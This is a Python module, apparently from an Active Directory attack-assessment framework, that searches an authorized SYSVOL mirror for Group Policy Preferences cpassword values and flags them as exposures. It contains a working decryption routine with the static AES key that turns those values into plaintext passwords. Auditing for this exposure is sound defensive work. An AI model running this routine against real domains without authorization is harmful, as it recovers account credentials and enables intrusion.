"""Evidence-first SYSVOL/GPP credential and task discovery."""

from __future__ import annotations

import base64
import json
from pathlib import Path
from typing import Any

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target


def _decrypt_cpassword(value: str) -> str | None:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

        key = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
        raw = base64.b64decode(value + "=" * (-len(value) % 4))
        decryptor = Cipher(algorithms.AES(key), modes.CBC(b"\x00" * 16)).decryptor()
        return decryptor.update(raw).decode("utf-16-le").rstrip("\x00")
    except Exception:
        return None


@register_capability(
    id="sysvol-hunt",
    summary="Search authorized SYSVOL evidence for GPP cpasswords, scripts, and tasks",
    category="credential-access",
    tags=("sysvol", "gpp", "cpassword", "evidence"),
)
class SysvolHunt:
    def run(
        self, target: Target, session: Session, graph: AttackGraph, **kwargs: Any
    ) -> dict[str, Any]:
        root = Path(str(kwargs.get("artifact") or kwargs.get("sysvol_path") or ""))
        if not root.is_dir():
            raise RuntimeError(
                "sysvol-hunt requires --artifact pointing to an authorized SYSVOL mirror"
            )
        findings: list[dict[str, Any]] = []
        for path in root.rglob("*.xml"):
            text = path.read_text(encoding="utf-8", errors="ignore")
            if "cpassword=" not in text:
                continue
            marker = 'cpassword="'
            value = text.split(marker, 1)[1].split('"', 1)[0]
            item = {
                "path": str(path),
                "kind": "gpp-cpassword",
                "recoverable": bool(_decrypt_cpassword(value)),
            }
            findings.append(item)
        result = {"root": str(root), "findings": findings, "count": len(findings)}
        session.path("sysvol-hunt.json").write_text(
            json.dumps(result, indent=2) + "\n", encoding="utf-8"
        )
        if findings:
            graph.add_edge(
                f"DOMAIN@{target.domain.upper()}",
                f"DOMAIN@{target.domain.upper()}",
                "GPPPasswordExposure",
                count=len(findings),
            )
        session.log("sysvol-hunt.complete", count=len(findings))
        return result
